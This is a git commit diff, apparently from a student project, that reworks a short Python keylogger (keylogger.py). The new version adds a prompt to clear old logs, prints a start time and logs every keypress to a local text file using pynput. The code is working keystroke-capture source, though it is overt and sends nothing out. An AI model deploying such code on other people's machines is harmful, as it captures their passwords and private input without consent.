d1f5d5757db9361dbf6dba3c376b9da127137ada
Joachim Vanneste <2460800V@student.gla.ac.uk>
2021-10-15 11:23:58 +0100

    nicer UI implemented

--- keylogger.py
+++ keylogger.py
@@ -1,12 +1,38 @@
 from pynput.keyboard import Key, Listener 
 import logging
+import datetime
 
-log_files = ""
 
-logging.basicConfig(filename = (log_files + "keyloggerout.txt"), level = logging.DEBUG, format='%(asctime)s: %(message)s')
+def main():
+	clearfile = input("Do you want to clear file from previous logging? (y/n): ")
+	if clearfile == 'y':
+		try:
+			file = open("keyloggerout.txt","r+")
+			file.truncate(0)
+			file.close()
+			print("File cleared")
+		except:
+			print("File does not exist yet")
 
-def on_press(key):
-	logging.info(str(key))
+	x = datetime.datetime.now()
+	print("Keylogging start: " + str(x))
 
-with Listener(on_press=on_press) as listener:
-	listener.join()
+
+	logging.basicConfig(filename = ("keyloggerout.txt"), level = logging.DEBUG, format='%(message)s')
+
+	def on_press(key):
+		logging.info(str(key))
+
+
+	with Listener(on_press=on_press) as listener:
+		listener.join()
+
+
+
+
+
+if __name__ == '__main__':
+	main()
+
+
+
